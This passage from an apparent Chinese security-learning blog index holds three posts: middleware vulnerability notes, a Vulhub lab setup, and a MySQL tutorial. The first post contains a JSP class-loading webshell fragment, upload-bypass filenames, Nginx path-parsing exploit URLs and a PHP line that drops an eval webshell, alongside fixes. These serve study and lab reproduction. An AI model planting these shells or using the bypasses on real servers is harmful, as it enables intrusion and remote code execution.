clazz.getMethod(&quot;getDecoder&quot;).invoke(null);\n            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);\n        &#125;\n    &#125;\n%&gt;\n&lt;%\n    String cls &#x3D; request.getParameter(&quot;passwd&quot;);\n    if (cls !&#x3D; null) &#123;\n        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);\n    &#125;\n%&gt;\n\n\n上传成功\n\n5.蚁剑连接测试代码\n\n注意：绕过 JspServlet 方式\nshell.jsp%20\nshell.jsp::$DATA\nshell.jsp&#x2F;\n\n\n\nNginx简介Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP&#x2F;POP3&#x2F;SMTP服务。 Nginx是一款轻量级的Web 服务器&#x2F;反向代理服务器及电子邮件（IMAP&#x2F;POP3）代理服务器，在BSD-like 协议下发行。 \n其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好。\n文件解析漏洞漏洞描述该漏洞与nginx、php版本无关,属于用户配置不当造成的解析漏洞。由于nginx.conf的如下配置导致 nginx把以’.php’结尾的文件交给fastcgi处理,对于任意文件名，在后面添加&#x2F;xxx.php（xxx）为任意字符 后，即可将文件作为php解析。\n漏洞原理Nginx默认是以CGI的方式支持PHP解析，普遍的做法是在Nginx配置文件中通过正则匹配设置 SCRIPT_FILENAME。\n当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为 “phpinfo.jpg&#x2F;1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参 数，并将phpinfo.jpg作为PHP文件解析呢？ \n这就要说到fix_pathinfo选项， 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为 SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解 析了。\n漏洞形式www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.php\nwww.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg%00.php [xxx.jpg%00.php (Nginx &lt;8.03 空字节代码执行漏洞)]\nwww.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%20.php\n\n另一种攻击手法： \n上传一个名字为test.jpg，以下为文件内容：\n&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;\n\n然后访问test.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php。\n漏洞复现1.切换php版本\n\n2.打开配置文件\n\n3.在网站根目录下创建111.jpg\n\n\n4.访问111.jpg\n\n5.在111.jpg后加&#x2F;xxx.php,我们111.jpg中的函数就会被执行\n\n当访问&#x2F;111.jpg&#x2F;xxx.php时，nginx将查看url，看到它以.php结尾，将路径传给PHP  fastcgi进行处理。但是fastcgi在处理’xxx.php’文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo&#x3D;1 发挥作用,这项配置默认开启，值为1，用于修复路径,如果当前路径不存在则采用上层路径。\n为此这里交由fastcgi处理的文件就变成了’&#x2F;1.jpg’。新版本的php的配置文件php-fpm.conf引入了“security.limit_extensions”，限制了可执行文件的后缀，默认只允许执行.php文件。\nCGI公共网关接口（Common Gateway Interface，CGI）是Web 服务器运行时外部程序的规范，按CGI 编 写的程序可以扩展服务器功能。 CGI 应用程序能与浏览器进行交互，还可通过数据API与数据库服务器等外部数据源进行通信，从数据库 服务器中获取数据。格式化为HTML文档后，发送给浏览器，也可以将从浏览器获得的数据放到数据库 中。 \n几乎所有服务器都支持CGI，可用任何语言编写CGI，包括流行的C、C ++、Java、VB 和Delphi 等。CGI 分为标准CGI和间接CGI两种。标准CGI使用命令行参数或环境变量表示服务器的详细请求，服务器与浏 览器通信采用标准输入输出方式。 间接CGI又称缓冲CGI，在CGI程序和CGI接口之间插入一个缓冲程序，缓冲程序与CGI接口间用标准输入 输出进行通信 。\n修复方案1.将php.ini文件中的cgi.fix_pathinfo的值设置为0\n2.php-fpm.conf中的security.limit_extensions后面的值设置为.php\n","slug":"中间件漏洞","date":"2022-11-24T09:06:22.005Z","categories_index":"学习笔记","tags_index":"漏洞","author_index":"Abyssaler"},{"id":"1fa64911bbe068fc2410b2322a01cf3e","title":"vulhub靶场环境搭建","content":"概述Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行一条命令即可编译、运行一个完整 的漏洞靶场镜像。 \nVulhub是一个基于 docker 和 docker-compose 的漏洞环境集合，进入对应目录并执行一条语句即可启 动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。\n安装环境安装dockersapt-get install curl\ncurl -s https:&#x2F;&#x2F;get.docker.com&#x2F; | sh\n\n\n\n\n\n配置镜像加速器mkdir -p &#x2F;etc&#x2F;docker\n\ntee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;\n&#123;\n&quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;kn5vuonk.mirror.aliyuncs.com&quot;]\n&#125;\nEOF\n\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n\n\n\n安装pipapt install python3-pip\n\n\n安装docker-composepip install docker-compose\n\n\n安装gitapt-get install git\n\n\n将vulhub压缩包上传到服务器这里我是直接将压缩包放到虚拟机里面解压的\n\n启动环境docker-compose会自动查找当前目录下的配置文件（默认文件名为 docker-compose.yml ），并根据 其内容编译镜像和启动容器。\n 所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。 \n在vulhub中选择某个环境，进入对应的目录，如Flask服务端模板注入漏洞，进入flash目录\n\n我这里是进入tomcat目录\n\n对漏洞靶场进行编译和运行\ndocker-compose build\n或者\ndocker-commpose up -d\n\n注意： docker-compose up -d 运行后，会自动查找当前目录下的配置文件。如果配置文件中包含的环 境均已经存在，则不会再次编译；如果配置文件中包含的环境不存在，则会自动进行编译。所以，其实 docker-compose up -d 命令是包含了 docker-compose build 的\n\n查看端口映射关系sudo docker-compose config\n\n\nsudo docker-compose ps\n\n\n连接漏洞查看了端口映射过后直接在浏览器输入ip地址加端口号就可访问漏洞了\n\n关闭环境在关闭及移除环境的时候，也需要在对应目录下，执行下列命令\ndocker-compose down\n\n上述命令会执行如下几个动作：\n\n关闭正在运行的容器\n删除所有相关容器\n移除NAT（docker-compose在运行的时候会创建一个NAT网段）\n\n但不会移除编译好的漏洞镜像，下次再执行docker-compose up -d命令，就不需要再次编译相关镜像了。\n\nPS在主机中连接虚拟机的漏洞环境可能会出现超时无法响应的现象，但是在虚拟机中能访问\n\n\n是因为虚拟机没关防火墙的原因\n ubuntu关闭和开启防火墙\n1.关闭ubuntu的防火墙：ufw disable\n\n2.开启防火墙：ufw enable\n\n3.卸载了iptables:apt-get remove iptables\n\n4.关闭ubuntu中的防火墙的其余命令:\n    iptables -P INPUT ACCEPT\n    iptables -P FORWARD ACCEPT\n    iptables -P OUTPUT ACCEPT\n    iptables -F\n\n\n在虚拟机中关闭防火墙就好了\n\n","slug":"vulhub靶场环境搭建","date":"2022-11-24T07:27:30.937Z","categories_index":"环境配置","tags_index":"vulhub","author_index":"Abyssaler"},{"id":"ed24fbd407825b2a3a3f1a7f074c200e","title":"MYSQL在线笔记2","content":"基础篇通用语法及分类\nDDL: 数据定义语言，用来定义数据库对象（数据库、表、字段）\nDML: 数据操作语言，用来对数据库表中的数据进行增删改\nDQL: 数据查询语言，用来查询数据库中表的记录\nDCL: 数据控制语言，用来创建数据库用户、控制数据库的控制权限\n\nDDL（数据定义语言）数据定义语言\n数据库操作查询所有数据库：SHOW DATABASES;查询当前数据库：SELECT DATABASE();创建数据库：CREATE DATABASE [ IF NOT EXISTS ] 数据库名 [ DEFAULT CHARSET 字符集] [COLLATE 排序规则 ];删除数据库：DROP DATABASE [ IF EXISTS ] 数据库名;使用数据库：USE 数据库名;\n注意事项\nUTF8字符集长度为3字节，有些符号占4字节，所以推荐用utf8mb4字符集\n\n表操作查询当前数据库所有表：SHOW TABLES;查询表结构：DESC 表名;查询指定表的建表语句：SHOW CREATE TABLE 表名;\n创建表：\nCREATE TABLE 表名(\n\t字段1 字段1类型 [COMMENT 字段1注释],\n\t字段2 字段2类型 [COMMENT 字段2注释],\n\t字段3 字段3类型 [COMMENT 字段3注释],\n\t...\n\t字段n 字段n类型 [COMMENT 字段n注释]\n)[ COMMENT 表注释 ];\n最后一个字段后面没有逗号\n添加字段：ALTER TABLE 表名 ADD 字段名 类型(长度) [COMMENT 注释] [约束];例：ALTER TABLE emp ADD nickname varchar(20) COMMENT &#39;昵称&#39;;\n修改数据类型：ALTER TABLE 表名 MODIFY 字段名 新数据类型(长度);修改字段名和字段类型：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型(长度) [COMMENT 注释] [约束];例：将emp表的nickname字段修改为username，类型为varchar(30)ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT &#39;昵称&#39;;\n删除字段：ALTER TABLE 表名 DROP 字段名;\n修改表名：ALTER TABLE 表名 RENAME TO 新表名\n删除表：DROP TABLE [IF EXISTS] 表名;删除表，并重新创建该表：TRUNCATE TABLE 表名;\nDML（数据操作语言）添加数据指定字段：INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...);全部字段：INSERT INTO 表名 VALUES (值1, 值2, ...);\n批量添加数据：INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);INSERT INTO 表名 VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);\n注意事项\n字符串和日期类型数据应该包含在引号中\n插入的数据大小应该在字段的规定范围内\n\n更新和删除数据修改数据：UPDATE 表名 SET 字段名1 = 值1, 字段名2 = 值2, ... [ WHERE 条件 ];例：UPDATE emp SET name = &#39;Jack&#39; WHERE id = 1;\n删除数据：DELETE FROM 表名 [ WHERE 条件 ];\nDQL（数据查询语言）语法：\nSELECT\n\t字段列表\nFROM\n\t表名字段\nWHERE\n\t条件列表\nGROUP BY\n\t分组字段列表\nHAVING\n\t分组后的条件列表\nORDER BY\n\t排序字段列表\nLIMIT\n\t分页参数\n\n基础查询查询多个字段：SELECT 字段1, 字段2, 字段3, ... FROM 表名;SELECT * FROM 表名;\n设置别名：SELECT 字段1 [ AS 别名1 ], 字段2 [ AS 别名2 ], 字段3 [ AS 别名3 ], ... FROM 表名;SELECT 字段1 [ 别名1 ], 字段2 [ 别名2 ], 字段3 [ 别名3 ], ... FROM 表名;\n去除重复记录：SELECT DISTINCT 字段列表 FROM 表名;\n转义：SELECT * FROM 表名 WHERE name LIKE &#39;/_张三&#39; ESCAPE &#39;/&#39;&#x2F; 之后的_不作为通配符\n条件查询语法：SELECT 字段列表 FROM 表名 WHERE 条件列表;\n条件：\n\n\n\n比较运算符\n功能\n\n\n\n&gt;\n大于\n\n\n&gt;&#x3D;\n大于等于\n\n\n&lt;\n小于\n\n\n&lt;&#x3D;\n小于等于\n\n\n&#x3D;\n等于\n\n\n&lt;&gt; 或 !&#x3D;\n不等于\n\n\nBETWEEN … AND …\n在某个范围内（含最小、最大值）\n\n\nIN(…)\n在in之后的列表中的值，多选一\n\n\nLIKE 占位符\n模糊匹配（_匹配单个字符，%匹配任意个字符）\n\n\nIS NULL\n是NULL\n\n\n\n\n\n逻辑运算符\n功能\n\n\n\nAND 或 &amp;&amp;\n并且（多个条件同时成立）\n\n\nOR 或 &amp;#124;&amp;#124;\n或者（多个条件任意一个成立）\n\n\nNOT 或 !\n非，不是\n\n\n例子：\n-- 年龄等于30\nselect * from employee where age &#x3D; 30;\n-- 年龄小于30\nselect * from employee where age &lt; 30;\n-- 小于等于\nselect * from employee where age &lt;&#x3D; 30;\n-- 没有身份证\nselect * from employee where idcard is null or idcard &#x3D; &#39;&#39;;\n-- 有身份证\nselect * from employee where idcard;\nselect * from employee where idcard is not null;\n-- 不等于\nselect * from employee where age !&#x3D; 30;\n-- 年龄在20到30之间\nselect * from employee where age between 20 and 30;\nselect * from employee where age &gt;&#x3D; 20 and age &lt;&#x3D; 30;\n-- 下面语句不报错，但查不到任何信息\nselect * from employee where age between 30 and 20;\n-- 性别为女且年龄小于30\nselect * from employee where age &lt; 30 and gender &#x3D; &#39;女&#39;;\n-- 年龄等于25或30或35\nselect * from employee where age &#x3D; 25 or age &#x3D; 30 or age &#x3D; 35;\nselect * from employee where age in (25, 30, 35);\n-- 姓名为两个字\nselect * from employee where name like &#39;__&#39;;\n-- 身份证最后为X\nselect * from employee where idcard like &#39;%X&#39;;\n\n聚合查询（聚合函数）常见聚合函数：\n\n\n\n函数\n功能\n\n\n\ncount\n统计数量\n\n\nmax\n最大值\n\n\nmin\n最小值\n\n\navg\n平均值\n\n\nsum\n求和\n\n\n语法：SELECT 聚合函数(字段列表) FROM 表名;例：SELECT count(id) from employee where workaddress = &quot;广东省&quot;;\n分组查询语法：SELECT 字段列表 FROM 表名 [ WHERE 条件 ] GROUP BY 分组字段名 [ HAVING 分组后的过滤条件 ];\nwhere 和 having 的区别：\n\n执行时机不同：where是分组之前进行过滤，不满足where条件不参与分组；having是分组后对结果进行过滤。\n判断条件不同：where不能对聚合函数进行判断，而having可以。\n\n例子：\n-- 根据性别分组，统计男性和女性数量（只显示分组数量，不显示哪个是男哪个是女）\nselect count(*) from employee group by gender;\n-- 根据性别分组，统计男性和女性数量\nselect gender, count(*) from employee group by gender;\n-- 根据性别分组，统计男性和女性的平均年龄\nselect gender, avg(age) from employee group by gender;\n-- 年龄小于45，并根据工作地址分组\nselect workaddress, count(*) from employee where age &lt; 45 group by workaddress;\n-- 年龄小于45，并根据工作地址分组，获取员工数量大于等于3的工作地址\nselect workaddress, count(*) address_count from employee where age &lt; 45 group by workaddress having address_count &gt;&#x3D; 3;\n\n注意事项\n执行顺序：where &gt; 聚合函数 &gt; having\n分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义\n\n排序查询语法：SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1, 字段2 排序方式2;\n排序方式：\n\nASC: 升序（默认）\nDESC: 降序\n\n例子：\n-- 根据年龄升序排序\nSELECT * FROM employee ORDER BY age ASC;\nSELECT * FROM employee ORDER BY age;\n-- 两字段排序，根据年龄升序排序，入职时间降序排序\nSELECT * FROM employee ORDER BY age ASC, entrydate DESC;\n\n注意事项如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序\n分页查询语法：SELECT 字段列表 FROM 表名 LIMIT 起始索引, 查询记录数;\n例子：\n-- 查询第一页数据，展示10条\nSELECT * FROM employee LIMIT 0, 10;\n-- 查询第二页\nSELECT * FROM employee LIMIT 10, 10;\n\n注意事项\n起始索引从0开始，起始索引 &#x3D; （查询页码 - 1） * 每页显示记录数\n分页查询是数据库的方言，不同数据库有不同实现，MySQL是LIMIT\n如果查询的是第一页数据，起始索引可以省略，直接简写 LIMIT 10\n\nDQL执行顺序FROM -&gt; WHERE -&gt; GROUP BY -&gt; SELECT -&gt; ORDER BY -&gt; LIMIT\nDCL管理用户查询用户：\nUSE mysql;\nSELECT * FROM user;\n\n创建用户:CREATE USER &#39;用户名&#39;@&#39;主机名&#39; IDENTIFIED BY &#39;密码&#39;;\n修改用户密码：ALTER USER &#39;用户名&#39;@&#39;主机名&#39; IDENTIFIED WITH mysql_native_password BY &#39;新密码&#39;;\n删除用户：DROP USER &#39;用户名&#39;@&#39;主机名&#39;;\n例子：\n-- 创建用户test，只能在当前主机localhost访问\ncreate user &#39;test&#39;@&#39;localhost&#39; identified by &#39;123456&#39;;\n-- 创建用户test，能在任意主机访问\ncreate user &#39;test&#39;@&#39;%&#39; identified by &#39;123456&#39;;\ncreate user &#39;test&#39; identified by &#39;123456&#39;;\n-- 修改密码\nalter user &#39;test&#39;@&#39;localhost&#39; identified with mysql_native_password by &#39;1234&#39;;\n-- 删除用户\ndrop user &#39;test&#39;@&#39;localhost&#39;;\n\n注意事项\n主机名可以使用 % 通配\n\n权限控制常用权限：\n\n\n\n权限\n说明\n\n\n\nALL, ALL PRIVILEGES\n所有权限\n\n\nSELECT\n查询数据\n\n\nINSERT\n插入数据\n\n\nUPDATE\n修改数据\n\n\nDELETE\n删除数据\n\n\nALTER\n修改表\n\n\nDROP\n删除数据库&#x2F;表&#x2F;视图\n\n\nCREATE\n创建数据库&#x2F;表\n\n\n更多权限请看权限一览表\n查询权限：SHOW GRANTS FOR &#39;用户名&#39;@&#39;主机名&#39;;\n授予权限：GRANT 权限列表 ON 数据库名.表名 TO &#39;用户名&#39;@&#39;主机名&#39;;\n撤销权限：REVOKE 权限列表 ON 数据库名.表名 FROM &#39;用户名&#39;@&#39;主机名&#39;;\n注意事项\n多个权限用逗号分隔\n授权时，数据库名和表名可以用 * 进行通配，代表所有\n\n函数\n字符串函数\n数值函数\n日期函数\n流程函数\n\n字符串函数常用函数：\n\n\n\n函数\n功能\n\n\n\nCONCAT(s1, s2, …, sn)\n字符串拼接，将s1, s2, …, sn拼接成一个字符串\n\n\nLOWER(str)\n将字符串全部转为小写\n\n\nUPPER(str)\n将字符串全部转为大写\n\n\nLPAD(str, n, pad)\n左填充，用字符串pad对str的左边进行填充，达到n个字符串长度\n\n\nRPAD(str, n, pad)\n右填充，用字符串pad对str的右边进行填充，达到n个字符串长度\n\n\nTRIM(str)\n去掉字符串头部和尾部的空格\n\n\nSUBSTRING(str, start, len)\n返回从字符串str从start位置起的len个长度的字符串\n\n\nREPLACE(column, source, replace)\n替换字符串\n\n\n使用示例：\n-- 拼接\nSELECT CONCAT(&#39;Hello&#39;, &#39;World&#39;);\n-- 小写\nSELECT LOWER(&#39;Hello&#39;);\n-- 大写\nSELECT UPPER(&#39;Hello&#39;);\n-- 左填充\nSELECT LPAD(&#39;01&#39;, 5, &#39;-&#39;);\n-- 右填充\nSELECT RPAD(&#39;01&#39;, 5, &#39;-&#39;);\n-- 去除空格\nSELECT TRIM(&#39; Hello World &#39;);\n-- 切片（起始索引为1）\nSELECT SUBSTRING(&#39;Hello World&#39;, 1, 5);\n\n数值函数常见函数：\n\n\n\n函数\n功能\n\n\n\nCEIL(x)\n向上取整\n\n\nFLOOR(x)\n向下取整\n\n\nMOD(x, y)\n返回x&#x2F;y的模\n\n\nRAND()\n返回0~1内的随机数\n\n\nROUND(x, y)\n求参数x的四舍五入值，保留y位小数\n\n\n日期函数常用函数：\n\n\n\n函数\n功能\n\n\n\nCURDATE()\n返回当前日期\n\n\nCURTIME()\n返回当前时间\n\n\nNOW()\n返回当前日期和时间\n\n\nYEAR(date)\n获取指定date的年份\n\n\nMONTH(date)\n获取指定date的月份\n\n\nDAY(date)\n获取指定date的日期\n\n\nDATE_ADD(date, INTERVAL expr type)\n返回一个日期&#x2F;时间值加上一个时间间隔expr后的时间值\n\n\nDATEDIFF(date1, date2)\n返回起始时间date1和结束时间date2之间的天数\n\n\n例子：\n-- DATE_ADD\nSELECT DATE_ADD(NOW(), INTERVAL 70 YEAR);\n\n流程函数常用函数：\n\n\n\n函数\n功能\n\n\n\nIF(value, t, f)\n如果value为true，则返回t，否则返回f\n\n\nIFNULL(value1, value2)\n如果value1不为空，返回value1，否则返回value2\n\n\nCASE WHEN [ val1 ] THEN [ res1 ] … ELSE [ default ] END\n如果val1为true，返回res1，… 否则返回default默认值\n\n\nCASE [ expr ] WHEN [ val1 ] THEN [ res1 ] … ELSE [ default ] END\n如果expr的值等于val1，返回res1，… 否则返回default默认值\n\n\n例子：\nselect\n\tname,\n\t(case when age &gt; 30 then &#39;中年&#39; else &#39;青年&#39; end)\nfrom employee;\nselect\n\tname,\n\t(case workaddress when &#39;北京市&#39; then &#39;一线城市&#39; when &#39;上海市&#39; then &#39;一线城市&#39; else &#39;二线城市&#39; end) as &#39;工作地址&#39;\nfrom employee;\n\n约束分类：\n\n\n\n约束\n描述\n关键字\n\n\n\n非空约束\n限制该字段的数据不能为null\nNOT NULL\n\n\n唯一约束\n保证该字段的所有数据都是唯一、不重复的\nUNIQUE\n\n\n主键约束\n主键是一行数据的唯一标识，要求非空且唯一\nPRIMARY KEY\n\n\n默认约束\n保存数据时，如果未指定该字段的值，则采用默认值\nDEFAULT\n\n\n检查约束（8.0.1版本后）\n保证字段值满足某一个条件\nCHECK\n\n\n外键约束\n用来让两张图的数据之间建立连接，保证数据的一致性和完整性\nFOREIGN KEY\n\n\n约束是作用于表中字段上的，可以再创建表&#x2F;修改表的时候添加约束。\n常用约束\n\n\n约束条件\n关键字\n\n\n\n主键\nPRIMARY KEY\n\n\n自动增长\nAUTO_INCREMENT\n\n\n不为空\nNOT NULL\n\n\n唯一\nUNIQUE\n\n\n逻辑条件\nCHECK\n\n\n默认值\nDEFAULT\n\n\n例子：\ncreate table user(\n\tid int primary key auto_increment,\n\tname varchar(10) not null unique,\n\tage int check(age &gt; 0 and age &lt; 120),\n\tstatus char(1) default &#39;1&#39;,\n\tgender char(1)\n);\n\n外键约束添加外键：\nCREATE TABLE 表名(\n\t字段名 字段类型,\n\t...\n\t[CONSTRAINT] [外键名称] FOREIGN KEY(外键字段名) REFERENCES 主表(主表列名)\n);\nALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段名) REFERENCES 主表(主表列名);\n\n-- 例子\nalter table emp add constraint fk_emp_dept_id foreign key(dept_id) references dept(id);\n\n删除外键：ALTER TABLE 表名 DROP FOREIGN KEY 外键名;\n删除&#x2F;更新行为\n\n\n行为\n说明\n\n\n\nNO ACTION\n当在父表中删除&#x2F;更新对应记录时，首先检查该记录是否有对应外键，如果有则不允许删除&#x2F;更新（与RESTRICT一致）\n\n\nRESTRICT\n当在父表中删除&#x2F;更新对应记录时，首先检查该记录是否有对应外键，如果有则不允许删除&#x2F;更新（与NO ACTION一致）\n\n\nCASCADE\n当在父表中删除&#x2F;更新对应记录时，首先检查该记录是否有对应外键，如果有则也删除&#x2F;更新外键在子表中的记录\n\n\nSET NULL\n当在父表中删除&#x2F;更新对应记录时，首先检查该记录是否有对应外键，如果有则设置子表中该外键值为null（要求该外键允许为null）\n\n\nSET DEFAULT\n父表有变更时，子表将外键设为一个默认值（Innodb不支持）\n\n\n更改删除&#x2F;更新行为：ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名(主表字段名) ON UPDATE 行为 ON DELETE 行为;\n多表查询多表关系\n一对多（多对一）\n多对多\n一对一\n\n一对多案例：部门与员工关系：一个部门对应多个员工，一个员工对应一个部门实现：在多的一方建立外键，指向一的一方的主键\n多对多案例：学生与课程关系：一个学生可以选多门课程，一门课程也可以供多个学生选修实现：建立第三张中间表，中间表至少包含两个外键，分别关联两方主键\n一对一案例：用户与用户详情关系：一对一关系，多用于单表拆分，将一张表的基础字段放在一张表中，其他详情字段放在另一张表中，以提升操作效率实现：在任意一方加入外键，关联另外一方的主键，并且设置外键为唯一的（UNIQUE）\n查询合并查询（笛卡尔积，会展示所有组合结果）：select * from employee, dept;\n\n\n\n\n\n\n\n\n\n笛卡尔积：两个集合A集合和B集合的所有组合情况（在多表查询时，需要消除无效的笛卡尔积）\n消除无效笛卡尔积：select * from employee, dept where employee.dept = dept.id;\n内连接查询内连接查询的是两张表交集的部分\n隐式内连接：SELECT 字段列表 FROM 表1, 表2 WHERE 条件 ...;\n显式内连接：SELECT 字段列表 FROM 表1 [ INNER ] JOIN 表2 ON 连接条件 ...;\n显式性能比隐式高\n例子：\n-- 查询员工姓名，及关联的部门的名称\n-- 隐式\nselect e.name, d.name from employee as e, dept as d where e.dept &#x3D; d.id;\n-- 显式\nselect e.name, d.name from employee as e inner join dept as d on e.dept &#x3D; d.id;\n\n外连接查询左外连接：查询左表所有数据，以及两张表交集部分数据SELECT 字段列表 FROM 表1 LEFT [ OUTER ] JOIN 表2 ON 条件 ...;相当于查询表1的所有数据，包含表1和表2交集部分数据\n右外连接：查询右表所有数据，以及两张表交集部分数据SELECT 字段列表 FROM 表1 RIGHT [ OUTER ] JOIN 表2 ON 条件 ...;\n例子：\n-- 左\nselect e.*, d.name from employee as e left outer join dept as d on e.dept &#x3D; d.id;\nselect d.name, e.* from dept d left outer join emp e on e.dept &#x3D; d.id;  -- 这条语句与下面的语句效果一样\n-- 右\nselect d.name, e.* from employee as e right outer join dept as d on e.dept &#x3D; d.id;\n\n左连接可以查询到没有dept的employee，右连接可以查询到没有employee的dept\n自连接查询当前表与自身的连接查询，自连接必须使用表别名\n语法：SELECT 字段列表 FROM 表A 别名A JOIN 表A 别名B ON 条件 ...;\n自连接查询，可以是内连接查询，也可以是外连接查询\n例子：\n-- 查询员工及其所属领导的名字\nselect a.name, b.name from employee a, employee b where a.manager &#x3D; b.id;\n-- 没有领导的也查询出来\nselect a.name, b.name from employee a left join employee b on a.manager &#x3D; b.id;\n\n联合查询 union, union all把多次查询的结果合并，形成一个新的查询集\n语法：\nSELECT 字段列表 FROM 表A ...\nUNION [ALL]\nSELECT 字段列表 FROM 表B ...\n\n注意事项\nUNION ALL 会有重复结果，UNION 不会\n联合查询比使用or效率高，不会使索引失效\n\n子查询SQL语句中嵌套SELECT语句，称谓嵌套查询，又称子查询。SELECT * FROM t1 WHERE column1 = ( SELECT column1 FROM t2);子查询外部的语句可以是 INSERT &#x2F; UPDATE &#x2F; DELETE &#x2F; SELECT 的任何一个\n根据子查询结果可以分为：\n\n标量子查询（子查询结果为单个值）\n列子查询（子查询结果为一列）\n行子查询（子查询结果为一行）\n表子查询（子查询结果为多行多列）\n\n根据子查询位置可分为：\n\nWHERE 之后\nFROM 之后\nSELECT 之后\n\n标量子查询子查询返回的结果是单个值（数字、字符串、日期等）。常用操作符：- &lt; &gt; &gt; &gt;&#x3D; &lt; &lt;&#x3D;\n例子：\n-- 查询销售部所有员工\nselect id from dept where name &#x3D; &#39;销售部&#39;;\n-- 根据销售部部门ID，查询员工信息\nselect * from employee where dept &#x3D; 4;\n-- 合并（子查询）\nselect * from employee where dept &#x3D; (select id from dept where name &#x3D; &#39;销售部&#39;);\n\n-- 查询xxx入职之后的员工信息\nselect * from employee where entrydate &gt; (select entrydate from employee where name &#x3D; &#39;xxx&#39;);\n\n列子查询返回的结果是一列（可以是多行）。\n常用操作符：\n\n\n\n操作符\n描述\n\n\n\nIN\n在指定的集合范围内，多选一\n\n\nNOT IN\n不在指定的集合范围内\n\n\nANY\n子查询返回列表中，有任意一个满足即可\n\n\nSOME\n与ANY等同，使用SOME的地方都可以使用ANY\n\n\nALL\n子查询返回列表的所有值都必须满足\n\n\n例子：\n-- 查询销售部和市场部的所有员工信息\nselect * from employee where dept in (select id from dept where name &#x3D; &#39;销售部&#39; or name &#x3D; &#39;市场部&#39;);\n-- 查询比财务部所有人工资都高的员工信息\nselect * from employee where salary &gt; all(select salary from employee where dept &#x3D; (select id from dept where name &#x3D; &#39;财务部&#39;));\n-- 查询比研发部任意一人工资高的员工信息\nselect * from employee where salary &gt; any (select salary from employee where dept &#x3D; (select id from dept where name &#x3D; &#39;研发部&#39;));\n\n行子查询返回的结果是一行（可以是多列）。常用操作符：&#x3D;, &lt;, &gt;, IN, NOT IN\n例子：\n-- 查询与xxx的薪资及直属领导相同的员工信息\nselect * from employee where (salary, manager) &#x3D; (12500, 1);\nselect * from employee where (salary, manager) &#x3D; (select salary, manager from employee where name &#x3D; &#39;xxx&#39;);\n\n表子查询返回的结果是多行多列常用操作符：IN\n例子：\n-- 查询与xxx1，xxx2的职位和薪资相同的员工\nselect * from employee where (job, salary) in (select job, salary from employee where name &#x3D; &#39;xxx1&#39; or name &#x3D; &#39;xxx2&#39;);\n-- 查询入职日期是2006-01-01之后的员工，及其部门信息\nselect e.*, d.* from (select * from employee where entrydate &gt; &#39;2006-01-01&#39;) as e left join dept as d on e.dept &#x3D; d.id;\n\n事务事务是一组操作的集合，事务会把所有操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败。\n基本操作：\n-- 1. 查询张三账户余额\nselect * from account where name &#x3D; &#39;张三&#39;;\n-- 2. 将张三账户余额-1000\nupdate account set money &#x3D; money - 1000 where name &#x3D; &#39;张三&#39;;\n-- 此语句出错后张三钱减少但是李四钱没有增加\n模拟sql语句错误\n-- 3. 将李四账户余额+1000\nupdate account set money &#x3D; money + 1000 where name &#x3D; &#39;李四&#39;;\n\n-- 查看事务提交方式\nSELECT @@AUTOCOMMIT;\n-- 设置事务提交方式，1为自动提交，0为手动提交，该设置只对当前会话有效\nSET @@AUTOCOMMIT &#x3D; 0;\n-- 提交事务\nCOMMIT;\n-- 回滚事务\nROLLBACK;\n\n-- 设置手动提交后上面代码改为：\nselect * from account where name &#x3D; &#39;张三&#39;;\nupdate account set money &#x3D; money - 1000 where name &#x3D; &#39;张三&#39;;\nupdate account set money &#x3D; money + 1000 where name &#x3D; &#39;李四&#39;;\ncommit;\n\n操作方式二：\n开启事务：START TRANSACTION 或 BEGIN TRANSACTION;提交事务：COMMIT;回滚事务：ROLLBACK;\n操作实例：\nstart transaction;\nselect * from account where name &#x3D; &#39;张三&#39;;\nupdate account set money &#x3D; money - 1000 where name &#x3D; &#39;张三&#39;;\nupdate account set money &#x3D; money + 1000 where name &#x3D; 